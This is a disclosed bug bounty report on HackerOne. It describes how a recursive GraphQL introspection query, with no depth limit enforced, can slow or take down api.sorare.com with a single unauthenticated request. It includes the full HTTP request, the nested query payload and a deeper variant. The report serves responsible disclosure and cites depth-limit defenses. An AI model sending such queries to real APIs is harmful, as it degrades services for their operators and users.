# Circular based introspetion Query leading to single request denial of service and cost consumption and query cost on api.sorare.com/graphql

## Report Details
- **Report ID**: 2048725
- **URL**: https://hackerone.com/reports/2048725
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-07-03T17:37:00.570Z
- **Disclosed**: 2024-10-17T08:07:20.077Z

## Reporter
- **Username**: thebeast99
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sorare

## Vulnerability Information
## Summary:

Hi Team, Hope you are doing great Sorare graphql Api has introspection enabled by default as per the policy it's meant to be public so they can facilitate their users with Graphql Playground.

So https://api.sorare.com/federal/graphql is for the users and clients using the web application and https://api.sorare.com/graphql is a playground for the developers and clients. They both share the same domain and database just a different graphql instance We can execute the same query on both graphql servers parallelly. But the catch here is because of the no-depth limits an attacker can execute a circular introspection query which is leading to a single request denial of service which is affecting both instances same time. Users don't need to be authenticated for this attack which is an extreme condition.

APIs are always the backbone of the organization and a firm. If left vulnerable that kinda attack requires a single request to take down the server and can Impact the Availability of the company. And bypassing the `Cloudflare DDOS` which is playing a role as a frontier to prevent such cases.
You have to consider this that it is not a typical DOS attack that requires so many bots or computational power a single query can Do pretty much damage.




## Steps To Reproduce:

Its been years now and we all know what an introspection query looks like but with the graphql feature, we can also retrieve just one query time at a time from  `__schema` we can just retrieve all fields of `mutations`, `queries` and `subscription`. By calling fields and their types.

***Here is the request***:
```
POST /graphql HTTP/2
Host: api.sorare.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US
Accept-Encoding: gzip, deflate
Referer: https://api.sorare.com/graphql/playground
Content-Type: application/json
Origin: https://api.sorare.com
Content-Length: 262
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"operationName":null,"variables":{},"query":"query {\r\n __schema {\r\n   types { \r\n    fields {\r\n      type {\r\n    fields {\r\n      type { \r\n    fields {\r\n      type {\r\n     fields {\r\n     name\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}"}
```
From the above query, you will get the `3728114` bytes of data in the single query which is obviously duplicated can be seen in the query request and the delay will be around `5 to 7 seconds` which is extreme degradation condition for a backend server.

***Response In my case***:
{F2465261}

You can Add more recursive loops `the more loop the more delay`
***Here is the query with one more circular recursive loop***

```
{"operationName":null,"variables":{},"query":"query {\r\n __schema {\r\n   types { \r\n    fields {\r\n      type {\r\n    fields {\r\n      type { \r\n    fields {\r\n      type {\r\n     fields {\r\n     type {\r\n     fields {\r\n      name\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}"}

```
 Now you can see more delay.

I hope you can see the impact of this vulnerability. If there is anything the team wants to know I would be grateful!

 Best & kind regards
@thebeast99

## Supporting Material/References:

Here is the official Apollo guide regarding the depth limits.
https://www.apollographql.com/docs/technotes/TN0021-graph-security/#limit-query-depth

Note: I set the cvss as per the bug But because the scope is `High asset` my report automatically scored as 9.3 critical whereas in other cases it's always standard `7.5` High.

## Impact

An attacker can take down the server with few or a single graphql request. Which will cost Availability to sorare.com

## Attachments
- sorare_dos.PNG
